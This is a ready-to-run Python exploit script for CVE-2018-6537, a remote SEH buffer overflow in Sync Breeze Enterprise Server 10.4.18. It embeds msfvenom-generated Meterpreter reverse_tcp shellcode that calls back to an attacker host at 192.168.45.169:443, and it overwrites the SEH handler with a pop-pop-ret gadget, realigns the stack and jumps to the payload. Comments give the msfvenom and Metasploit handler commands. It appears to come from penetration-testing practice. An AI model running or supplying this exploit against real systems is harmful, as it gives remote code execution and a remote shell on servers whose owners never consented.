#!/usr/bin/python

# CVE-2018-6537
# Sync Breeze Enterprise Server v10.4.18 - Remote SEH Overflow 
# Tested on: Windows 10 Pro (x86)

import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 9121
  size = 1000
  
  #nop slide to ensure shellcode decoder has space on the stack, avoids mangling shellcode.
  shellcode = b"\x90" * 20
  
  # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.169 LPORT=443 -b "\x00\x02\x0A\x0D\xF8\xFD" -f python -v shellcode
  # metasploit handler to catch shell (sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.45.169; set LPORT 443; exploit")
  shellcode =  b""
  shellcode += b"\xbf\xc2\x58\xc2\x13\xdd\xc0\xd9\x74\x24\xf4"
  shellcode += b"\x5b\x31\xc9\xb1\x59\x31\x7b\x14\x83\xc3\x04"
  shellcode += b"\x03\x7b\x10\x20\xad\x3e\xfb\x2b\x4e\xbf\xfc"
  shellcode += b"\x53\xc6\x5a\xcd\x41\xbc\x2f\x7c\x55\xb6\x62"
  shellcode += b"\x8d\x1e\x9a\x96\x82\x97\x51\xb1\xad\x28\xee"
  shellcode += b"\xcf\xe5\xe7\x31\x83\xca\x66\xce\xde\x1e\x48"
  shellcode += b"\xef\x10\x53\x89\x28\xe7\x19\x66\xe4\x73\xb3"
  shellcode += b"\x68\x82\xc6\x08\x89\x44\x4d\x30\xf1\xe1\x92"
  shellcode += b"\xe6\x75\xa6\x13\xd9\x25\xbd\x4c\xf9\xc4\x12"
  shellcode += b"\xe7\xb1\xde\x11\x31\x35\xe2\x50\xf3\x49\x91"
  shellcode += b"\x57\x78\xb4\x73\xa6\xbe\x1b\xba\x06\x33\x65"
  shellcode += b"\xfb\xa1\xac\x10\xf7\xd1\x51\x23\xcc\xa8\x8d"
  shellcode += b"\xa6\xd2\x0b\x45\x10\x36\xad\x8a\xc7\xbd\xa1"
  shellcode += b"\x67\x83\x99\xa5\x76\x40\x92\xd2\xf3\x67\x74"
  shellcode += b"\x53\x47\x4c\x50\x3f\x13\xed\xc1\xe5\xf2\x12"
  shellcode += b"\x11\x41\xaa\xb6\x5a\x60\xbd\xc7\xa3\x7a\xc2"
  shellcode += b"\x95\x33\xb6\x0f\x26\xc3\xd0\x18\x55\xf1\x7f"
  shellcode += b"\xb3\xf1\xb9\x08\x1d\x05\xc8\x1f\x9e\xd9\x72"
  shellcode += b"\x4f\x60\xda\x82\x59\xa7\x8e\xd2\xf1\x0e\xaf"
  shellcode += b"\xb9\x01\xae\x7a\x57\x08\x38\x45\x0f\x21\x11"
  shellcode += b"\x2d\x4d\x3a\x60\x15\xd8\xdc\x32\x39\x8a\x70"
  shellcode += b"\xf3\xe9\x6a\x21\x9b\xe3\x65\x1e\xbb\x0b\xac"
  shellcode += b"\x37\x56\xe4\x18\x6f\xcf\x9d\x01\xfb\x6e\x61"
  shellcode += b"\x9c\x81\xb1\xe9\x14\x75\x7f\x1a\x5d\x65\x68"
  shellcode += b"\x7d\x9d\x75\x69\xe8\x9d\x1f\x6d\xba\xca\xb7"
  shellcode += b"\x6f\x9b\x3c\x18\x8f\xce\x3f\x5f\x6f\x8f\x09"
  shellcode += b"\x2b\x46\x05\x35\x43\xa7\xc9\xb5\x93\xf1\x83"
  shellcode += b"\xb5\xfb\xa5\xf7\xe6\x1e\xaa\x2d\x9b\xb2\x3f"
  shellcode += b"\xce\xcd\x67\x97\xa6\xf3\x5e\xdf\x68\x0c\xb5"
  shellcode += b"\x63\x6e\xf2\x4b\x4c\xd7\x9a\xb3\xcc\xe7\x5a"
  shellcode += b"\xde\xcc\xb7\x32\x15\xe2\x38\xf2\xd6\x29\x11"
  shellcode += b"\x9a\x5d\xbc\xd3\x3b\x61\x95\xb2\xe5\x62\x1a"
  shellcode += b"\x6f\x16\x18\x53\x90\xd7\xdd\x7d\xf5\xd8\xdd"
  shellcode += b"\x81\x0b\xe5\x0b\xb8\x79\x28\x88\xff\x72\x1f"
  shellcode += b"\xad\x56\x19\x5f\xe1\xa9\x08"

  inputBuffer = b"\x41" * 124
  
  #_except_handler overwrite and short jump
  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x90" * 2 #nops for reallignment 
  # asm x86 island hop to allign stack pointer to address of shellcode variable
  # ? 01f0fc74 - @esp = 00000830 (0x830)
  inputBuffer+= b"\x66\x81\xc4\x30\x08"   # add sp, 0x830 ( alternative to add esp, 0x830 as it contains nullbytes)
  # redirect execution to our shellcode via jmp esp instruction
  inputBuffer+= b"\xff\xe4"               # jmp esp opcode
  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode)) #nop sled
  inputBuffer+= shellcode

  header =  b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer 

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
